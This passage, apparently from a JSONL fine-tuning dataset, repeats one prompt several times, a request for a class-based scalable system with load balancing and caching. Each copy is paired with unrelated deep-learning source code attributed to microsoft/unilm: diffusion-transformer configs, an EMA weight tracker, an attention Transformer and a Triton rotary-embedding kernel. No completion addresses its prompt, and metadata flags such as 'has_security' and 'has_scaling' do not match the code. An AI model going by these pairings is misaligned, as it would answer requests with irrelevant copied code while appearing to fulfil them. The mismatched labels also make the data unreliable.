D/2)\r\n\r\n    emb = np.concatenate([emb_sin, emb_cos], axis=1)  # (M, D)\r\n    return emb\r\n\r\n\r\n#################################################################################\r\n#                                   DiT Configs                                  #\r\n#################################################################################\r\n\r\ndef DiT_13B(**kwargs):\r\n    return DiT(depth=40, hidden_size=5120, num_heads=40, **kwargs)\r\n\r\ndef DiT_7B(**kwargs):\r\n    return DiT(depth=32, hidden_size=4096, num_heads=32, **kwargs)\r\n\r\ndef DiT_3B(**kwargs):\r\n    return DiT(depth=32, hidden_size=2560, num_heads=20, **kwargs)\r\n\r\ndef DiT_XL(**kwargs):\r\n    return DiT(depth=24, hidden_size=2048, num_heads=16, **kwargs)\r\n\r\ndef DiT_Large(**kwargs):\r\n    return DiT(depth=24, hidden_size=1536, num_heads=12, **kwargs)\r\n\r\ndef DiT_Medium(**kwargs):\r\n    return DiT(depth=24, hidden_size=1024, num_heads=16, **kwargs)\r\n\r\ndef DiT_Base(**kwargs):\r\n    return DiT(depth=12, hidden_size=768, num_heads=12, **kwargs)\r\n\r\nDiT_models = {\r\n    'DiT-13B': DiT_13B, 'DiT-7B': DiT_7B, 'DiT-3B': DiT_3B, 'DiT-XL': DiT_XL, 'DiT-Large': DiT_Large,\r\n    'DiT-Medium':  DiT_Medium, 'DiT-Base': DiT_Base\r\n}", "metadata": {"source": "github.com/microsoft/unilm", "file_path": "LatentLM/models/DiT.py", "language": "python", "complexity": "complex", "star_count": 21572, "quality_score": 0.98, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 430}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import copy\r\nfrom typing import Any, Dict, Iterable, Optional, Union\r\n\r\nimport torch\r\n\r\n# Adapted from torch-ema https://github.com/fadel/pytorch_ema/blob/master/torch_ema/ema.py#L14\r\nclass EMAModel:\r\n    \"\"\"\r\n    Exponential Moving Average of models weights\r\n    \"\"\"\r\n\r\n    def __init__(\r\n        self,\r\n        parameters: Iterable[torch.nn.Parameter],\r\n        decay: float = 0.9999,\r\n        min_decay: float = 0.0,\r\n        update_after_step: int = 0,\r\n        use_ema_warmup: bool = False,\r\n        inv_gamma: Union[float, int] = 1.0,\r\n        power: Union[float, int] = 2 / 3,\r\n        model_cls: Optional[Any] = None,\r\n        model_config: Dict[str, Any] = None,\r\n        **kwargs,\r\n    ):\r\n        \"\"\"\r\n        Args:\r\n            parameters (Iterable[torch.nn.Parameter]): The parameters to track.\r\n            decay (float): The decay factor for the exponential moving average.\r\n            min_decay (float): The minimum decay factor for the exponential moving average.\r\n            update_after_step (int): The number of steps to wait before starting to update the EMA weights.\r\n            use_ema_warmup (bool): Whether to use EMA warmup.\r\n            inv_gamma (float):\r\n                Inverse multiplicative factor of EMA warmup. Default: 1. Only used if `use_ema_warmup` is True.\r\n            power (float): Exponential factor of EMA warmup. Default: 2/3. Only used if `use_ema_warmup` is True.\r\n            device (Optional[Union[str, torch.device]]): The device to store the EMA weights on. If None, the EMA\r\n                        weights will be stored on CPU.\r\n\r\n        @crowsonkb's notes on EMA Warmup:\r\n            If gamma=1 and power=1, implements a simple average. gamma=1, power=2/3 are good values for models you plan\r\n            to train for a million or more steps (reaches decay factor 0.999 at 31.6K steps, 0.9999 at 1M steps),\r\n            gamma=1, power=3/4 for models you plan to train for less (reaches decay factor 0.999 at 10K steps, 0.9999\r\n            at 215.4k steps).\r\n        \"\"\"\r\n        parameters = list(parameters)\r\n        self.shadow_params = [p.clone().detach() for p in parameters]\r\n        self.temp_stored_params = None\r\n\r\n        self.decay = decay\r\n        self.min_decay = min_decay\r\n        self.update_after_step = update_after_step\r\n        self.use_ema_warmup = use_ema_warmup\r\n        self.inv_gamma = inv_gamma\r\n        self.power = power\r\n        self.optimization_step = 0\r\n        self.cur_decay_value = None  # set in `step()`\r\n\r\n        self.model_cls = model_cls\r\n        self.model_config = model_config\r\n\r\n    def get_decay(self, optimization_step: int) -> float:\r\n        \"\"\"\r\n        Compute the decay factor for the exponential moving average.\r\n        \"\"\"\r\n        step = max(0, optimization_step - self.update_after_step - 1)\r\n\r\n        if step <= 0:\r\n            return 0.0\r\n\r\n        if self.use_ema_warmup:\r\n            cur_decay_value = 1 - (1 + step / self.inv_gamma) ** -self.power\r\n        else:\r\n            cur_decay_value = (1 + step) / (10 + step)\r\n\r\n        cur_decay_value = min(cur_decay_value, self.decay)\r\n        # make sure decay is not smaller than min_decay\r\n        cur_decay_value = max(cur_decay_value, self.min_decay)\r\n        return cur_decay_value\r\n\r\n    @torch.no_grad()\r\n    def step(self, parameters: Iterable[torch.nn.Parameter]):\r\n        parameters = list(parameters)\r\n\r\n        self.optimization_step += 1\r\n\r\n        # Compute the decay factor for the exponential moving average.\r\n        decay = self.get_decay(self.optimization_step)\r\n        self.cur_decay_value = decay\r\n        one_minus_decay = 1 - decay\r\n        for s_param, param in zip(self.shadow_params, parameters):\r\n            if param.requires_grad:\r\n                s_param.sub_(one_minus_decay * (s_param - param))\r\n            else:\r\n                s_param.copy_(param)\r\n\r\n    def to(self, device=None, dtype=None) -> None:\r\n        r\"\"\"Move internal buffers of the ExponentialMovingAverage to `device`.\r\n\r\n        Args:\r\n            device: like `device` argument to `torch.Tensor.to`\r\n        \"\"\"\r\n        # .to() on the tensors handles None correctly\r\n        self.shadow_params = [\r\n            p.to(device=device, dtype=dtype) if p.is_floating_point() else p.to(device=device)\r\n            for p in self.shadow_params\r\n        ]\r\n\r\n    def state_dict(self) -> dict:\r\n        r\"\"\"\r\n        Returns the state of the ExponentialMovingAverage as a dict. This method is used by accelerate during\r\n        checkpointing to save the ema state dict.\r\n        \"\"\"\r\n        return {\r\n            \"decay\": self.decay,\r\n            \"min_decay\": self.min_decay,\r\n            \"optimization_step\": self.optimization_step,\r\n            \"update_after_step\": self.update_after_step,\r\n            \"use_ema_warmup\": self.use_ema_warmup,\r\n            \"inv_gamma\": self.inv_gamma,\r\n            \"power\": self.power,\r\n            \"shadow_params\": self.shadow_params,\r\n        }\r\n\r\n    def load_state_dict(self, state_dict: dict) -> None:\r\n        r\"\"\"\r\n        Args:\r\n        Loads the ExponentialMovingAverage state. This method is used by accelerate during checkpointing to save the\r\n        ema state dict.\r\n            state_dict (dict): EMA state. Should be an object returned\r\n                from a call to :meth:`state_dict`.\r\n        \"\"\"\r\n        # deepcopy, to be consistent with module API\r\n        state_dict = copy.deepcopy(state_dict)\r\n\r\n        self.decay = state_dict.get(\"decay\", self.decay)\r\n        if self.decay < 0.0 or self.decay > 1.0:\r\n            raise ValueError(\"Decay must be between 0 and 1\")\r\n\r\n        self.min_decay = state_dict.get(\"min_decay\", self.min_decay)\r\n        if not isinstance(self.min_decay, float):\r\n            raise ValueError(\"Invalid min_decay\")\r\n\r\n        self.optimization_step = state_dict.get(\"optimization_step\", self.optimization_step)\r\n        if not isinstance(self.optimization_step, int):\r\n            raise ValueError(\"Invalid optimization_step\")\r\n\r\n        self.update_after_step = state_dict.get(\"update_after_step\", self.update_after_step)\r\n        if not isinstance(self.update_after_step, int):\r\n            raise ValueError(\"Invalid update_after_step\")\r\n\r\n        self.use_ema_warmup = state_dict.get(\"use_ema_warmup\", self.use_ema_warmup)\r\n        if not isinstance(self.use_ema_warmup, bool):\r\n            raise ValueError(\"Invalid use_ema_warmup\")\r\n\r\n        self.inv_gamma = state_dict.get(\"inv_gamma\", self.inv_gamma)\r\n        if not isinstance(self.inv_gamma, (float, int)):\r\n            raise ValueError(\"Invalid inv_gamma\")\r\n\r\n        self.power = state_dict.get(\"power\", self.power)\r\n        if not isinstance(self.power, (float, int)):\r\n            raise ValueError(\"Invalid power\")\r\n\r\n        shadow_params = state_dict.get(\"shadow_params\", None)\r\n        for model_param, ema_param in zip(self.shadow_params, shadow_params):\r\n                model_param.data = ema_param.data.to(model_param)\r\n\r\n", "metadata": {"source": "github.com/microsoft/unilm", "file_path": "LatentLM/models/EMA.py", "language": "python", "complexity": "medium", "star_count": 21572, "quality_score": 0.98, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 166}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Copyright (c) Meta Platforms, Inc. and affiliates.\r\n# All rights reserved.\r\n\r\n# This source code is licensed under the license found in the\r\n# LICENSE file in the root directory of this source tree.\r\n# --------------------------------------------------------\r\n# References:\r\n# GLIDE: https://github.com/openai/glide-text2im\r\n# MAE: https://github.com/facebookresearch/mae/blob/main/models_mae.py\r\n# --------------------------------------------------------\r\nimport functools\r\nimport torch\r\nimport torch.nn as nn\r\nimport torch.nn.functional as F\r\nfrom timm.models.vision_transformer import PatchEmbed\r\ntry:\r\n    from flash_attn import flash_attn_func\r\n    has_flash_attn2 = torch.cuda.get_device_properties(0).major >= 8\r\nexcept ImportError:\r\n    has_flash_attn2 = False\r\n    print(\"flash_attn2 not found\")\r\n\r\nfrom .DiT import LabelEmbedder, TimestepEmbedder, FinalLayer, SwiGLU, modulate\r\nfrom .kernel.rotary import apply_rotary_pos_emb as apply_rotary_emb\r\nfrom .RMSNorm import RMSNorm\r\n\r\ndef repeat_kv(x: torch.Tensor, n_rep: int) -> torch.Tensor:\r\n    \"\"\"torch.repeat_interleave(x, dim=1, repeats=n_rep)\"\"\"\r\n    bs, n_kv_heads, slen, head_dim = x.shape\r\n    if n_rep == 1:\r\n        return x\r\n    return (\r\n        x[:, :, None, :, :]\r\n        .expand(bs, n_kv_heads, n_rep, slen, head_dim)\r\n        .reshape(bs, n_kv_heads * n_rep, slen, head_dim)\r\n    )\r\n\r\nclass Attention(nn.Module):\r\n    def __init__(self, dim, num_heads=8, num_kv_heads=8, qkv_bias=False, attn_drop=0., proj_drop=0.):\r\n        super().__init__()\r\n        self.dim = dim\r\n        self.head_dim = dim // num_heads\r\n        self.num_heads = num_heads\r\n        self.num_kv_heads = num_kv_heads\r\n        self.n_rep = num_heads // num_kv_heads\r\n        head_dim = dim // num_heads\r\n        self.scale = head_dim ** -0.5\r\n\r\n        self.qkv = nn.Linear(dim, dim + 2 * self.num_kv_heads * self.head_dim, bias=qkv_bias)\r\n        self.attn_drop = nn.Dropout(attn_drop)\r\n        self.proj = nn.Linear(dim, dim, bias=False)\r\n        self.proj_drop = nn.Dropout(proj_drop)\r\n\r\n    def forward(self, x, start_pos, rel_pos, incremental_state=None):\r\n        B, N, C = x.shape\r\n        qkv = self.qkv(x).reshape(B, N, self.num_heads + 2 * self.num_kv_heads, self.head_dim)\r\n        q, k, v = torch.split(qkv, [self.num_heads, self.num_kv_heads, self.num_kv_heads], dim=2)\r\n        q = apply_rotary_emb(q, *rel_pos, interleaved=True)\r\n        k = apply_rotary_emb(k, *rel_pos, interleaved=True)\r\n        if incremental_state is not None:\r\n            incremental_state[\"key\"][:B, start_pos : start_pos + N] = k\r\n            incremental_state[\"value\"][:B, start_pos : start_pos + N] = v\r\n            k = incremental_state[\"key\"][:B, :start_pos + N]\r\n            v = incremental_state[\"value\"][:B, :start_pos + N]\r\n        if has_flash_attn2 and (x.dtype == torch.float16 or x.dtype == torch.bfloat16):\r\n            x = flash_attn_func(q, k, v, causal=True, dropout_p=self.attn_drop.p if self.training else 0.)\r\n        else:\r\n            q = q.transpose(1, 2)\r\n            k = repeat_kv(k.transpose(1, 2), self.n_rep)\r\n            v = repeat_kv(v.transpose(1, 2), self.n_rep)\r\n            x = F.scaled_dot_product_attention(\r\n                q, k, v,\r\n                is_causal=incremental_state is None,\r\n                dropout_p=self.attn_drop.p if self.training else 0.,\r\n            )\r\n            x = x.transpose(1, 2)\r\n\r\n        x = self.proj(x.reshape(B, N, C))\r\n        x = self.proj_drop(x)\r\n        return x\r\n    \r\nclass Block(nn.Module):\r\n    def __init__(self, hidden_size, num_heads, num_kv_heads, mlp_ratio=4.0, proj_drop=0., attn_drop=0., **block_kwargs):\r\n        super().__init__()\r\n        self.norm1 = RMSNorm(hidden_size, elementwise_affine=False, eps=1e-6)\r\n        self.attn = Attention(hidden_size, num_heads=num_heads, num_kv_heads=num_kv_heads, qkv_bias=False, proj_drop=proj_drop, attn_drop=attn_drop, **block_kwargs)\r\n        self.norm2 = RMSNorm(hidden_size, elementwise_affine=False, eps=1e-6)\r\n        mlp_hidden_dim = int(hidden_size * mlp_ratio * 2 / 3 / 64) * 64\r\n        self.mlp = SwiGLU(hidden_size, mlp_hidden_dim, drop=proj_drop)\r\n\r\n    def forward(self, x, start_pos, rel_pos, incremental_state=None):\r\n        x = x + self.attn(self.norm1(x), start_pos, rel_pos, incremental_state)\r\n        x = x + self.mlp(self.norm2(x))\r\n        return x\r\n\r\nclass MLPBlock(nn.Module):\r\n    def __init__(self, hidden_size,  mlp_ratio=4.0, drop=0.0, **block_kwargs):\r\n        super().__init__()\r\n        self.norm = RMSNorm(hidden_size, elementwise_affine=False, eps=1e-6)\r\n        mlp_hidden_dim = int(hidden_size * mlp_ratio * 2 / 3 / 64) * 64\r\n        self.mlp = SwiGLU(hidden_size, mlp_hidden_dim, drop=drop)\r\n        self.adaLN_modulation = nn.Sequential(\r\n            nn.SiLU(),\r\n            nn.Linear(hidden_size, 3 * hidden_size, bias=False)\r\n        )\r\n\r\n    def forward(self, x, c):\r\n        shift_mlp, scale_mlp, gate_mlp = self.adaLN_modulation(c).chunk(3, dim=-1)\r\n        x = x + gate_mlp * self.mlp(modulate(self.norm(x), shift_mlp, scale_mlp))\r\n        return x\r\n\r\nclass ConditionLayer(nn.Module):\r\n    def __init__(self, hidden_size):\r\n        super().__init__()\r\n        self.norm_final = RMSNorm(hidden_size, elementwise_affine=False, eps=1e-6)\r\n        self.linear = nn.Linear(hidden_size, hidden_size, bias=False)\r\n\r\n    def forward(self, x):\r\n        x = self.norm_final(x)\r\n        x = self.linear(x)\r\n        return x\r\n\r\nclass Transformer(nn.Module):\r\n    def __init__(\r\n        self,\r\n        input_size=32,\r\n        patch_size=1,\r\n        flatten_input=False,\r\n        in_channels=4,\r\n        hidden_size=1152,\r\n        depth=28,\r\n        diffusion_depth=3,\r\n        num_heads=16,\r\n        num_kv_heads=None,\r\n        mlp_ratio=4.0,\r\n        class_dropout_prob=0.1,\r\n        num_classes=1000,\r\n        posi_scale=1,\r\n        drop=0.0,\r\n        norm_layer=None\r\n    ):\r\n        super().__init__()\r\n        self.in_channels = in_channels\r\n        self.out_channels = in_channels\r\n        self.input_size = input_size\r\n        self.patch_size = patch_size\r\n        self.num_heads = num_heads\r\n        self.num_kv_heads = num_kv_heads if num_kv_heads is not None else num_heads\r\n        self.head_dim = hidden_size // num_heads\r\n        self.hidden_size = hidden_size\r\n        self.flatten_input_size = input_size * input_size\r\n        self.flatten_input = flatten_input\r\n        self.posi_scale = posi_scale\r\n\r\n        self.x_embedder = PatchEmbed(input_size, patch_size, in_channels, hidden_size, strict_img_size=False, norm_layer=norm_layer) if not flatten_input else nn.Linear(in_channels, hidden_size, bias=False)\r\n        self.noisy_x_embedder = PatchEmbed(input_size, patch_size, in_channels, hidden_size, strict_img_size=False, norm_layer=norm_layer) if not flatten_input else nn.Linear(in_channels, hidden_size, bias=False)\r\n        self.t_embedder = TimestepEmbedder(hidden_size)\r\n        self.y_embedder = LabelEmbedder(num_classes, hidden_size, class_dropout_prob)\r\n        self._precomputed_freqs_cis = None\r\n\r\n        self.blocks = nn.ModuleList([\r\n            Block(hidden_size, self.num_heads, self.num_kv_heads, mlp_ratio=mlp_ratio, proj_drop=drop, attn_drop=drop) for _ in range(depth)\r\n        ])\r\n        self.diffusion_blocks = nn.ModuleList([\r\n            MLPBlock(hidden_size, mlp_ratio=mlp_ratio) for _ in range(diffusion_depth)\r\n        ])\r\n        self.condition_layer = ConditionLayer(hidden_size)\r\n        self.final_layer = FinalLayer(hidden_size, patch_size * patch_size * self.out_channels if not flatten_input else self.out_channels)\r\n\r\n        self.initialize_weights()\r\n\r\n    def initialize_weights(self):\r\n        # Initialize transformer layers:\r\n        def _basic_init(module):\r\n            if isinstance(module, nn.Linear):\r\n                if module.bias is not None:\r\n                    nn.init.constant_(module.bias, 0)\r\n        self.apply(_basic_init)\r\n        # Initialize patch_embed like nn.Linear (instead of nn.Conv2d):\r\n        if not self.flatten_input:\r\n            nn.init.constant_(self.x_embedder.proj.bias, 0)\r\n\r\n        # Initialize label embedding table, timestep embedding MLP, and CLS:\r\n        nn.init.normal_(self.y_embedder.embedding_table.weight, std=0.02)\r\n        nn.init.normal_(self.t_embedder.mlp[0].weight, std=0.02)\r\n        nn.init.normal_(self.t_embedder.mlp[2].weight, std=0.02)\r\n\r\n        # Zero-out adaLN modulation layers in DiT blocks:\r\n        for block in self.diffusion_blocks:\r\n            nn.init.constant_(block.adaLN_modulation[-1].weight, 0)\r\n\r\n        # Zero-out output layers:\r\n        nn.init.constant_(self.final_layer.adaLN_modulation[-1].weight, 0)\r\n        nn.init.constant_(self.final_layer.linear.weight, 0)\r\n        \r\n    @property\r\n    def device(self):\r\n        return next(self.parameters()).device\r\n\r\n    @property\r\n    def dtype(self):\r\n        return next(self.parameters()).dtype\r\n\r\n    def unpatchify(self, x):\r\n        \"\"\"\r\n        x: (N, T, patch_size**2 * C)\r\n        imgs: (N, H, W, C)\r\n        \"\"\"\r\n        c = self.out_channels\r\n        p = self.x_embedder.patch_size[0]\r\n        h = w = int(x.shape[1] ** 0.5)\r\n        assert h * w == x.shape[1]\r\n\r\n        x = x.reshape(shape=(x.shape[0], h, w, p, p, c))\r\n        x = torch.einsum('nhwpqc->nchpwq', x)\r\n        imgs = x.reshape(shape=(x.shape[0], c, h * p, h * p))\r\n        return imgs\r\n\r\n    def build_rel_pos(self, x, start_pos = 0):\r\n        if self._precomputed_freqs_cis is None:\r\n            angle = 1.0 / ((10000 * self.posi_scale) ** torch.linspace(0, 1, self.head_dim // 2, dtype=torch.float, device=x.device))\r\n            index = torch.arange(self.flatten_input_size).to(angle)\r\n            self._precomputed_freqs_cis = index[:, None] * angle\r\n\r\n        cos = torch.cos(self._precomputed_freqs_cis[start_pos:start_pos+x.size(1)])\r\n        sin = torch.sin(self._precomputed_freqs_cis[start_pos:start_pos+x.size(1)])\r\n        rel_pos = (cos.to(x.dtype), sin.to(x.dtype))\r\n\r\n        return rel_pos\r\n\r\n    def forward(self, x_noise, t, x_start, y, batch_mul=1):\r\n        \"\"\"\r\n        Forward pass of ransformer.\r\n        x: (N, C, H, W) tensor of spatial inputs (images or latent representations of images)\r\n        t: (N,) tensor of diffusion timesteps\r\n        y: (N,) tensor of class labels\r\n        \"\"\"\r\n        condition = self.forward_parallel(x_start, y)\r\n        condition = condition.repeat_interleave(batch_mul, dim=0)\r\n        x = self.forward_diffusion(x_noise, t, condition)\r\n        return x\r\n    \r\n    def forward_parallel(self, x, y):\r\n        x = self.x_embedder(x)\r\n        y = self.y_embedder(y, self.training)\r\n        x = torch.cat((y.unsqueeze(1), x[:, :-1]), dim=1)\r\n        rel_pos = self.build_rel_pos(x)\r\n        for block in self.blocks:\r\n            x = block(x, 0, rel_pos)\r\n \r\n        x = self.condition_layer(x)\r\n        return x\r\n    \r\n    def forward_recurrent(self, x, start_pos = 0, incremental_state = None):\r\n        start_pos = start_pos if start_pos != 0 else 0\r\n        x = self.y_embedder(x, self.training).unsqueeze(1) if start_pos == 0 else self.x_embedder(x)\r\n        rel_pos = self.build_rel_pos(x, start_pos)\r\n        for idx, block in enumerate(self.blocks):\r\n            if incremental_state is not None and idx not in incremental_state:\r\n                incremental_state[idx] = {\r\n                    \"key\": torch.empty(x.shape[0], self.flatten_input_size, self.num_kv_heads, self.head_dim, device=x.device, dtype=x.dtype),\r\n                    \"value\": torch.empty(x.shape[0], self.flatten_input_size, self.num_kv_heads, self.head_dim, device=x.device, dtype=x.dtype),\r\n                }\r\n            x = block(x, start_pos, rel_pos, incremental_state[idx])\r\n            \r\n        x = self.condition_layer(x[:, -1:])\r\n        return x\r\n    \r\n    def forward_diffusion(self, x, t, condition):\r\n        bsz, seq_len = t.shape if t.dim() > 1 else (t.shape[0], 1)\r\n        t = self.t_embedder(t.view(-1)).view(bsz, seq_len, -1)\r\n        c = condition + t\r\n        x = self.noisy_x_embedder(x)\r\n        \r\n        for block in self.diffusion_blocks:\r\n            x = block(x, c)\r\n            \r\n        x = self.final_layer(x, c)\r\n        if not self.flatten_input:\r\n            x = self.unpatchify(x)         # (N, out_channels, H, W)\r\n        return x\r\n    \r\n    def sample_with_cfg(self, prev_token, cfg_scale, sample_func):\r\n        bsz, half_bsz = prev_token.shape[0], prev_token.shape[0] // 2\r\n        incremental_state = {}\r\n        samples = []\r\n        for i in range(self.flatten_input_size):\r\n            if self.flatten_input:\r\n                z = torch.randn(bsz, 1, self.in_channels, device=self.device, dtype=self.dtype)\r\n            else:\r\n                p = self.noisy_x_embedder.patch_size[0]\r\n                h = w = self.input_size // p\r\n                z = torch.randn(bsz, self.in_channels, p, p, device=self.device, dtype=self.dtype)\r\n            recurrent_input = torch.cat([prev_token, prev_token], dim=0) if i != 0 else prev_token\r\n            condition = self.forward_recurrent(recurrent_input, start_pos = i, incremental_state=incremental_state)\r\n            prev_token = sample_func(functools.partial(self.forward_with_cfg, condition=condition, cfg_scale=cfg_scale), z)\r\n            prev_token, _ = prev_token.chunk(2, dim=0)  # Remove null class samples\r\n            samples.append(prev_token)\r\n        if self.flatten_input:\r\n            samples = torch.cat(samples, 1)\r\n        else:\r\n            samples = torch.stack(samples, 2).view(half_bsz, self.in_channels, h, w, p, p).permute(0, 1, 2, 4, 3, 5).reshape(half_bsz, self.in_channels, h * p, w * p)\r\n        return samples\r\n\r\n    def forward_with_cfg(self, x, t, condition, cfg_scale):\r\n        \"\"\"\r\n        Forward pass of ClassTransformer, but also batches the unconditional forward pass for classifier-free guidance.\r\n        \"\"\"\r\n        # https://github.com/openai/glide-text2im/blob/main/notebooks/text2im.ipynb\r\n        half = x[: len(x) // 2]\r\n        combined = torch.cat([half, half], dim=0)\r\n        eps = self.forward_diffusion(combined, t, condition)\r\n        cond_eps, uncond_eps = torch.split(eps, len(eps) // 2, dim=0)\r\n        half_eps = uncond_eps + cfg_scale * (cond_eps - uncond_eps)\r\n        eps = torch.cat([half_eps, half_eps], dim=0)\r\n        return eps\r\n\r\n#################################################################################\r\n#                                   Transformer Configs                                  #\r\n#################################################################################\r\n\r\ndef Transformer_13B(**kwargs):\r\n    return Transformer(depth=40, hidden_size=5120, num_heads=40, mlp_ratio=6, **kwargs)\r\n\r\ndef Transformer_7B(**kwargs):\r\n    return Transformer(depth=32, hidden_size=4096, num_heads=32, mlp_ratio=6, **kwargs)\r\n\r\ndef Transformer_3B(**kwargs):\r\n    return Transformer(depth=32, hidden_size=2560, num_heads=20, mlp_ratio=6, **kwargs)\r\n\r\ndef Transformer_XL(**kwargs):\r\n    return Transformer(depth=24, hidden_size=2048, num_heads=16, mlp_ratio=6, **kwargs)\r\n\r\ndef Transformer_Large(**kwargs):\r\n    return Transformer(depth=24, hidden_size=1536, num_heads=12, mlp_ratio=6, **kwargs)\r\n\r\ndef Transformer_Medium(**kwargs):\r\n    return Transformer(depth=24, hidden_size=1024, num_heads=16, mlp_ratio=6, **kwargs)\r\n\r\ndef Transformer_Base(**kwargs):\r\n    return Transformer(depth=12, hidden_size=768, num_heads=12, mlp_ratio=6, **kwargs)\r\n\r\ndef Transformer_H(**kwargs):\r\n    return Transformer(depth=40, hidden_size=1280, num_heads=20, mlp_ratio=4, diffusion_depth=12, **kwargs)\r\n\r\ndef Transformer_L(**kwargs):\r\n    return Transformer(depth=32, hidden_size=1024, num_heads=16, mlp_ratio=4, diffusion_depth=8, **kwargs)\r\n\r\ndef Transformer_B(**kwargs):\r\n    return Transformer(depth=24, hidden_size=768, num_heads=12, mlp_ratio=4, diffusion_depth=6, **kwargs)\r\n\r\nTransformer_models = {\r\n    'Transformer-13B': Transformer_13B, 'Transformer-7B': Transformer_7B, 'Transformer-3B': Transformer_3B, 'Transformer-XL': Transformer_XL, 'Transformer-Large': Transformer_Large, 'Transformer-Medium':  Transformer_Medium, 'Transformer-Base': Transformer_Base,\r\n    'Transformer-H': Transformer_H, 'Transformer-L': Transformer_L, 'Transformer-B': Transformer_B\r\n}", "metadata": {"source": "github.com/microsoft/unilm", "file_path": "LatentLM/models/Transformer.py", "language": "python", "complexity": "complex", "star_count": 21572, "quality_score": 1.0, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": true, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 355}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design scalable system architecture with load balancing and caching\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Copyright (c) 2023, Tri Dao.\r\n\r\nfrom typing import Optional, Union\r\n\r\nimport torch\r\n\r\nimport triton\r\nimport triton.language as tl\r\n\r\n\r\n# @triton.autotune(\r\n#     configs=[\r\n#         triton.Config({\"BLOCK_M\": 2}),\r\n#         triton.Config({\"BLOCK_M\": 4}),\r\n#         triton.Config({\"BLOCK_M\": 8}),\r\n#         triton.Config({\"BLOCK_M\": 16}),\r\n#     ],\r\n#     key=[\"CACHE_KEY_SEQLEN\", \"BLOCK_K\", \"INTERLEAVED\"],\r\n# )\r\n@triton.jit\r\ndef rotary_kernel(\r\n    OUT,  # Pointers to matrices\r\n    X,\r\n    COS,\r\n    SIN,\r\n    CU_SEQLENS,\r\n    SEQLEN_OFFSETS,  # this could be int or a pointer\r\n    # Matrix dimensions\r\n    seqlen,\r\n    nheads,\r\n    rotary_dim,\r\n    seqlen_ro,\r\n    CACHE_KEY_SEQLEN,\r\n    # strides\r\n    stride_out_batch,\r\n    stride_out_seqlen,\r\n    stride_out_nheads,\r\n    stride_out_headdim,\r\n    stride_x_batch,\r\n    stride_x_seqlen,\r\n    stride_x_nheads,\r\n    stride_x_headdim,\r\n    # Meta-parameters\r\n    BLOCK_K: tl.constexpr,\r\n    IS_SEQLEN_OFFSETS_TENSOR: tl.constexpr,\r\n    IS_VARLEN: tl.constexpr,\r\n    INTERLEAVED: tl.constexpr,\r\n    CONJUGATE: tl.constexpr,\r\n    BLOCK_M: tl.constexpr,\r\n):\r\n    pid_m = tl.program_id(axis=0)\r\n    pid_batch = tl.program_id(axis=1)\r\n    pid_head = tl.program_id(axis=2)\r\n    rotary_dim_half = rotary_dim // 2\r\n\r\n    if not IS_VARLEN:\r\n        X = X + pid_batch * stride_x_batch + pid_head * stride_x_nheads\r\n        OUT = OUT + pid_batch * stride_out_batch + pid_head * stride_out_nheads\r\n    else:\r\n        start_idx = tl.load(CU_SEQLENS + pid_batch)\r\n        seqlen = tl.load(CU_SEQLENS + pid_batch + 1) - start_idx\r\n        X = X + start_idx * stride_x_seqlen + pid_head * stride_x_nheads\r\n        OUT = OUT + start_idx * stride_out_seqlen + pid_head * stride_out_nheads\r\n\r\n    if pid_m * BLOCK_M >= seqlen:\r\n        return\r\n    rm = pid_m * BLOCK_M + tl.arange(0, BLOCK_M)\r\n    if not IS_SEQLEN_OFFSETS_TENSOR:\r\n        rm_cs = rm + SEQLEN_OFFSETS\r\n    else:\r\n        rm_cs = rm + tl.load(SEQLEN_OFFSETS + pid_batch)\r\n    rk = tl.arange(0, BLOCK_K)\r\n    rk_half = tl.arange(0, BLOCK_K // 2)\r\n\r\n    if not INTERLEAVED:\r\n        # Load the 1st and 2nd halves of X, do calculation, then store to 1st and 2nd halves of OUT\r\n        X = X + (rm[:, None] * stride_x_seqlen + rk_half[None, :] * stride_x_headdim)\r\n        COS = COS + (rm_cs[:, None] * rotary_dim_half + rk_half[None, :])\r\n        SIN = SIN + (rm_cs[:, None] * rotary_dim_half + rk_half[None, :])\r\n        cos = tl.load(\r\n            COS, mask=(rm_cs[:, None] < seqlen_ro) & (rk_half[None, :] < rotary_dim_half), other=1.0\r\n        ).to(tl.float32)\r\n        sin = tl.load(\r\n            SIN, mask=(rm_cs[:, None] < seqlen_ro) & (rk_half[None, :] < rotary_dim_half), other=0.0\r\n        ).to(tl.float32)\r\n        x0 = tl.load(\r\n            X, mask=(rm[:, None] < seqlen) & (rk_half[None, :] < rotary_dim_half), other=0.0\r\n        ).to(tl.float32)\r\n        x1 = tl.load(\r\n            X + rotary_dim_half * stride_x_headdim,\r\n            mask=(rm[:, None] < seqlen) & (rk_half[None, :] < rotary_dim_half),\r\n            other=0.0,\r\n        ).to(tl.float32)\r\n        if CONJUGATE:\r\n            sin = -sin\r\n        o0 = x0 * cos - x1 * sin\r\n        o1 = x0 * sin + x1 * cos\r\n        # write back result\r\n        OUT = OUT + (rm[:, None] * stride_out_seqlen + rk_half[None, :] * stride_out_headdim)\r\n        tl.store(OUT, o0, mask=(rm[:, None] < seqlen) & 